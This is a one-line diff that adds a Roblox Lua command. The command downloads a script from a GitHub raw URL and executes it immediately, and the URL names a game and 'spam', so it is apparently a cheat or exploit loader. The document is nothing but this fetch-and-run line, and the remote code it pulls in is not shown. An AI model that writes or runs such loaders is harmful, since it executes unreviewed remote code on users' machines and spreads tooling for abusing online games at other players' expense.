@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/HarmonicPigeonExalt/loaders/main/loaders/build-a-soccer-club-spam2-tiycd4q3oavtpq.lua"))()
